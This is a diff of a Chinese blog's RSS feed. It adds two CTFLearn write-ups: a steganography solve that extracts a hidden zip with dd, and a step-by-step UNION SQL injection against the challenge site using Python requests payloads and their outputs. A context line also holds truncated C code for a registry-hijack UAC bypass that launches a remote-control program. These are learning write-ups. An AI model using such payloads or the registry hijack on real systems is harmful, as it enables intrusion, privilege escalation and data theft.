@@ -126,5 +126,38 @@ A、 hackbar</description>
 #include &amp;lt;Windows.h&amp;gt; BOOL SetReg(char* lpszExePath) { HKEY hKey = NULL; // 创建项  ::RegCreateKeyEx(HKEY_CURRENT_USER, &amp;#34;Software\\Classes\\mscfile\\Shell\\Open\\Command&amp;#34;, 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &amp;amp;hKey, NULL); // 设置键值  ::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)lpszExePath, (1 + ::lstrlen(lpszExePath))); // 关闭注册表  ::RegCloseKey(hKey); return TRUE; } int main() { BOOL bRet = FALSE; PVOID OldValue = NULL; // 关闭文件重定位  ::Wow64DisableWow64FsRedirection(&amp;amp;OldValue); // 修改注册表，设置我们的程序为启动目标  bRet = SetReg(&amp;#34;F:\\RemoteCtrl_Win10.</description>
     </item>
     
+    <item>
+      <title>CTFLearn-07601</title>
+      <link>https://xrg.fj.cn/p/ctflearn-07601/</link>
+      <pubDate>Fri, 18 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://xrg.fj.cn/p/ctflearn-07601/</guid>
+      <description>题目链接：(https://ctflearn.com/challenge/97)
+  一道隐写题，信息隐藏在给出的图片文件里。
+  打开图片，是一张普通的png，使用010editor打开，发现实际上是jpg格式（以FF开头）。
+  010 editor搜索FF D9，找到偏移量为0x256E处的那个，发现其后有敏感的PK字样，这是zip文件的开头，线索已经出现了。
+  使用命令分离出zip文件。dd if=AGT.png bs=1 skip=9584 of=foo.zip
+  解压文件，得到一个文件夹，里面含有一张图片I Warned You.jpeg
+  010 editor打开该文件，发现它实际上不符合JPG文件的格式。用记事本打开，ctrl + f查找ctf字样，得到flag。
+  回顾
+   这道题大概做了将近一小时&amp;hellip; 是我接触隐写题的简单解法之后第一次实践。解压之后的jpg文件使我一度怀疑自己对偏移量的计算存在问题，万万没想到这jpg格式完全是用来坑爹的（= = ||）。
+使用记事本一开始查找的是flag字串，结果是没找到，居然也没有再找一下其他可能的形式，就这么回去又反复检查zip文件的偏移地址了&amp;hellip;&amp;hellip;
+ </description>
+    </item>
+    
+    <item>
+      <title>CTFLearn-Inj3ctionTime</title>
+      <link>https://xrg.fj.cn/p/ctflearn-inj3ctiontime/</link>
+      <pubDate>Fri, 18 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://xrg.fj.cn/p/ctflearn-inj3ctiontime/</guid>
+      <description>题目链接：(https://ctflearn.com/challenge/149)
+ 此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&amp;hellip; &amp;hellip;
+  根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。   ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2&amp;#34;}) soup = BeautifulSoup(ret.text, &amp;#39;lxml&amp;#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。
+ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2 or 1=1&amp;#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用  至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。   首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。
+ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;-2 union select 1,2,3&amp;#34;}) # Output: # 0 results 结果表明3个字段是不对的，那么再增加：
+ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;-2 union select 1,2,3,4&amp;#34;}) # Output: # Name: 2 # Breed: 1 # Color: 3 非常Nice，不仅表明了查询的结果有四个字段，而且显示出每个字段对应的是什么含义。再试试5个字段：</description>
+    </item>
+    
   </channel>
 </rss>
